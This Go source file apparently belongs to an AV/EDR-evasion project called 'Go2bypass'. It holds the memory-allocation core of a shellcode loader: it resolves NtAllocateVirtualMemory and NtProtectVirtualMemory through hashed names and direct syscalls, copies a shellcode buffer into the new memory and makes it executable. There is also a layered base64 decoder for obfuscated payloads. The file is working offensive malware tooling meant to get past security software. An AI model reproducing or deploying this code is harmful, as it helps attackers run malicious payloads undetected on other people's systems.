package Public

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	B64number int = 4
)

func Str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Cpymem(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
func cusBase64decode(b64 string) string {
	var decoded []byte
	decoded, _ = base64.StdEncoding.DecodeString(b64)
	sum := 1
	for i := 1; i < B64number; i++ {
		decoded, _ = base64.StdEncoding.DecodeString(string(decoded))
		sum += i
	}
	return string(decoded)

}

func AllocProtect(sc []byte) uintptr {
	alloc, e := Go2gabh.GetSSNByNameExcept(Str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Str2sha1)
	if e != nil {
		os.Exit(0)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Sha256Hex)
	if e != nil {
		os.Exit(0)
	}
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var handle = uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(len(sc))
	_, r := Go2gabh.EggCall(
		uint16(alloc),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		os.Exit(0)
	}
	Cpymem(baseA, sc)
	var oldprotect uintptr
	_, r = Go2gabh.EggCall(
		uint16(protect),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		os.Exit(0)
	}
	return baseA
}
